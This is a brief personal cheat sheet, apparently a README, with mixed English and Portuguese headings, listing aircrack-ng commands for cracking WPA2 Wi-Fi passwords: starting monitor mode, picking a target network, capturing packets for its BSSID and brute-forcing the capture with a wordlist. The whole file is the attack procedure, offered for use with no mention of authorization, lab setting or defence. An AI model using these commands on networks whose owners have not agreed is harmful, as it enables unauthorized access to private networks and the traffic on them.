# Cracking WPA2

This is a simple file for remind me some wpa2 cracking instructions.

### Ligar monitoramento
	sudo airmon-ng start <interface>

### Selecionar um alvo
	sudo airodump-ng <monitor>

### Pegar pacotes
	sudo airodump-ng <monitor> -c <channel> --bssid <bssid> -w <filename>

### Bruteforce nos pacotes capturados
	aircrack -w <wordlist> -b <BSSID> <.CAP>
